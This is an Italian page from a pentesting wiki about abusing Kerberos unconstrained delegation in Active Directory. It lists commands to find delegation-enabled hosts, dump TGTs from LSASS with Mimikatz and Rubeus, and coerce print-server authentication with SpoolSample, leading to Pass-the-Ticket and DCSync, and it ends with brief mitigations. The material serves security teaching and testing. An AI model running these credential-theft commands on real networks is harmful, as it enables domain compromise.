# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Questa è una funzionalità che un Amministratore di Dominio può impostare su qualsiasi **Computer** all'interno del dominio. Quindi, ogni volta che un **utente accede** al Computer, una **copia del TGT** di quell'utente verrà **inviata all'interno del TGS** fornito dal DC **e salvata in memoria in LSASS**. Quindi, se hai privilegi di Amministratore sulla macchina, sarai in grado di **estrarre i ticket e impersonare gli utenti** su qualsiasi macchina.

Quindi, se un amministratore di dominio accede a un Computer con la funzionalità "Unconstrained Delegation" attivata, e tu hai privilegi di amministratore locale su quella macchina, sarai in grado di estrarre il ticket e impersonare l'Amministratore di Dominio ovunque (privilegi di dominio).

Puoi **trovare oggetti Computer con questo attributo** controllando se l'attributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contiene [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Puoi farlo con un filtro LDAP di ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, che è ciò che fa powerview:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs</code></pre>

Carica il ticket di Administrator (o utente vittima) in memoria con **Mimikatz** o **Rubeus per un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Ulteriori informazioni: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Ulteriori informazioni sulla delega non vincolata in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Se un attaccante è in grado di **compromettere un computer autorizzato per "Unconstrained Delegation"**, potrebbe **ingannare** un **Print server** per **accedere automaticamente** ad esso **salvando un TGT** nella memoria del server.\
Quindi, l'attaccante potrebbe eseguire un **attacco Pass the Ticket per impersonare** l'account computer del server di stampa.

Per far accedere un server di stampa a qualsiasi macchina puoi usare [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Se il TGT proviene da un controller di dominio, puoi eseguire un[ **DCSync attack**](acl-persistence-abuse/index.html#dcsync) e ottenere tutti gli hash dal DC.\
[**Ulteriori informazioni su questo attacco in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Ecco altri modi per cercare di forzare un'autenticazione:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigazione

- Limitare gli accessi DA/Admin a servizi specifici
- Impostare "L'account è sensibile e non può essere delegato" per gli account privilegiati.

{{#include ../../banners/hacktricks-training.md}}
